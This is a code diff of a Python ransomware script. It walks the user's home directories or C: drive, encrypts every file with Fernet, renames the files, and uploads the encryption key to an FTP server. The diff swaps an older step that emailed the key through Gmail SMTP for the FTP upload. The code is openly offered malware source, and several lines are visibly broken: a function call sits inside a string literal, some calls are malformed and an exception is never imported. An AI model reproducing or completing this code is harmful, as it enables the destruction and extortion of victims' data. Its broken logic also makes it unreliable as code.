@@ -1,8 +1,8 @@
 import os
 import random
 import string
-import smtplib
-from time import sleep
+import platform
+import ftplib
 from cryptography.fernet import Fernet
 
 
@@ -12,55 +12,88 @@ class Ransomware:
                  directories=[], 
                  files_dict={}, 
                  key=Fernet.generate_key()
-                 ):
+                 ) -> None:
         
-        os.chdir("C:/")  # Mac -> /Users  || Linux -> /home
+        with open("key.txt", "wb") as key_file:
+            key_file.write(key)
+
+        key_dir = "os.getcwd()" + "/key.txt"
+        self.key_dir = key_dir
+
+        system_name = platform.system()
+        if system_name == "Windows":
+            directory = "C:/"
+        elif system_name == "Darwin":
+            directory = "/Users"
+        elif system_name == "Linux":
+            directory = "/home"
+        else:
+            directory = "C:/"
+
+        os.chdir(directory)
+
         self.files = files
         self.directories = directories
         self.key = key
         self.files_dict = files_dict
 
-        self.message = f"KEY : {key} +\n files_list : {files}"
+        self.message = f"KEY : {key} +\nFiles_list :\n{files}"
 
     def id_generator(self, 
                      size, 
                      chars=string.ascii_lowercase + string.digits
-                    ):
+                    ) -> str:
                         
         return ''.join(random.choice(chars) for _ in range(size))
 
-    def files_dir(self):
-        for _ in os.listdir():
-            if _ == "ransom.py":
-                continue  # Do not encrypt the current file we are working with or the key
 
-            elif os.path.isfile(_):
-                self.files.append(_)  # Do not add if this is a directory, only if a file
+    def files_dir(self, directory) -> None:
+        system_dirs = ["Windows", "Program Files", "Program Files (x86)", "System Volume Information", "Boot", "Recovery"]
 
-            elif os.path.isdir(_):
-                self.directories.append(_)
+        for root, dirs, files in os.walk(self, directory):
+            # Skip system directories
+            if any(system_dir in root for system_dir in system_dirs):
+                continue
 
-        for dirs in self.directories:
-            if dirs == "ransom.py":
-                continue  # Do not encrypt the current file we are working with or the key
+            for file in files:
+                if file == "ransom.py":
+                    continue  # Do not encrypt the current file we are working with or the key
 
-            elif os.path.isfile(dirs):
-                self.files.append(dirs)
+                self.files.append(os.path.join(root, file))
 
-            elif os.path.isdir(dirs):
-                os.chdir(dirs)
+            for dir in dirs:
+                self.files_dir(os.path.join(root, dir))
 
-    def encrypt_loop(self):
+    def encrypt_loop(self) -> None:
         for file in self.files:
             with open(file, "rb") as the_file:
                 contents = the_file.read()
 
-            contents_encrypted = Fernet(self.key).encrypt(contents)
+            cipher_suite = Fernet(self.key)
+            contents_encrypted = cipher_suite.encrypt(contents)
 
             with open(file, "wb") as the_file:
                 the_file.write(contents_encrypted)
+            
+            # Verification step
+            with open(file, "rb") as the_file:
+                contents_encrypted = the_file.read()
+        
+            try:
+                contents_decrypted = cipher_suite.decrypt(contents_encrypted)
+                if contents == contents_decrypted:
+                    print(f"File {file} was successfully encrypted and verified.")
+                else:
+                    print(f"File {file} encryption verification failed.")
 
-    def rename_files(self):
+            except InvalidToken:
+                print(f"Could not decrypt file: {file}")
+            
+            except IOError:
+                print(f"Could not read file: {file}. Skipping...")
+                continue
+
+    def rename_files(self) -> None:
         for _ in self.files:
             if _ == '.DS_Store':
                 continue
@@ -74,24 +107,33 @@ class Ransomware:
 
             os.rename(_, last)
 
-    def mail_send(self, 
-                  email="", 
-                  password=""
-                 ):
-                     
-        msg = self.message
-        email_server = smtplib.SMTP("smtp.gmail.com", 587)
-        email_server.starttls()
-        email_server.login(email, password)
-        email_server.sendmail(email, email, msg)
-        sleep(10)
-        email_server.quit()
+    def send_file_to_ftp(self, 
+                         server="", 
+                         username="", 
+                         password="", 
+                         file_path="") -> bytes:
+        
+        file_path = self.key_dir
+        
+        ftp = ftplib.FTP(server)
+        ftp.login(user=username, passwd=password)
+        
+        try:
+            with open(file_path, 'rb') as file:
+                ftp.storbinary(f'STOR {file_path}', file)
+        except ftplib.error_perm:
+            print("Error: Check your file path")
+            return None
+        ftp.quit()
 
+        # assure to encrypt key file
+        encrypted = Fernet.encrypt(self.key)
+        with open(file_path, 'wb') as file:
+            file.write(encrypted)
+        os.remove(file_path)
 
 starter = Ransomware()
+starter.send_file_to_ftp()
 starter.files_dir()
 starter.encrypt_loop()
-starter.mail_send()
 starter.rename_files()
-
-# a lot coming
